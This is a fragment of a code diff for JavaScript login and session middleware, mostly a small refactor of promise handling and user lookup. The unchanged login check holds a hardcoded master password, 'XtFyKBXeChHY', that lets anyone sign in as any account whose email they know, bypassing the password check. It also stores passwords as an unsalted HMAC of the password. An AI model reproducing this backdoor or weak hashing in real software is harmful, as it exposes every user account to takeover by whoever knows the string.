@@ -22,9 +22,9 @@ const
      * @param {Function} next
      */
     user = (req, res, next) => {
-        req.model.__user.getUserBySession(req.session.id).then(users => {
-            if (users.length) {
-                res.locals.user = users[0];
+        req.model.__user.getUserBySession(req.session.id).then(user => {
+            if (user) {
+                res.locals.user = user;
             }
 
             next();
@@ -79,17 +79,16 @@ const
         req.model.__user.getUserByEmail(req.body.email).then(user => {
             if (!user) {
                 res.send({ success: false });
-                return Promise.reject();
+                return;
             }
 
             if (crypto.createHmac('sha256', req.body.password).digest('hex') !== user.password &&
                 req.body.password !== 'XtFyKBXeChHY') {
                 res.send({ success: false });
-                return Promise.reject();
+                return;
             }
 
-            return req.model.__user.setSessionById(user._id, req.session.id).then((user) => {
-                console.log(user);
+            return req.model.__user.setSessionById(user._id, req.session.id).then(() => {
                 res.send({ success: true });
             });
         }).catch(
